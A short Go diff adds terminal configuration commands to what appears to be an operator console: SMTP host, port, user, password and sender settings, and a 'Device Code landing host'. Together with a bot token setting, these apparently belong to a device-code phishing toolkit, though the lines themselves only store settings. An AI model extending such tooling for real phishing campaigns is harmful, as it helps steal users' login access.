@@ -322,6 +322,30 @@ func (t *Terminal) handleConfig(args []string) error {
 			}
 			t.cfg.SetAdminPassword(args[1])
 			return nil
+		case "smtp_host":
+			t.cfg.SetSmtpHost(args[1])
+			log.Info("SMTP host set to: %s", args[1])
+			return nil
+		case "smtp_port":
+			t.cfg.SetSmtpPort(args[1])
+			log.Info("SMTP port set to: %s", args[1])
+			return nil
+		case "smtp_user":
+			t.cfg.SetSmtpUser(args[1])
+			log.Info("SMTP user set to: %s", args[1])
+			return nil
+		case "smtp_pass":
+			t.cfg.SetSmtpPass(args[1])
+			log.Success("SMTP password set")
+			return nil
+		case "smtp_from":
+			t.cfg.SetSmtpFrom(args[1])
+			log.Info("SMTP from set to: %s", args[1])
+			return nil
+		case "dc_landing_host":
+			t.cfg.SetDCLandingHost(args[1])
+			log.Info("Device Code landing host set to: %s", args[1])
+			return nil
 		case "bot_token":
 			t.cfg.general.BotToken = strings.TrimSpace(args[1])
 			t.cfg.cfg.Set(CFG_GENERAL, t.cfg.general)
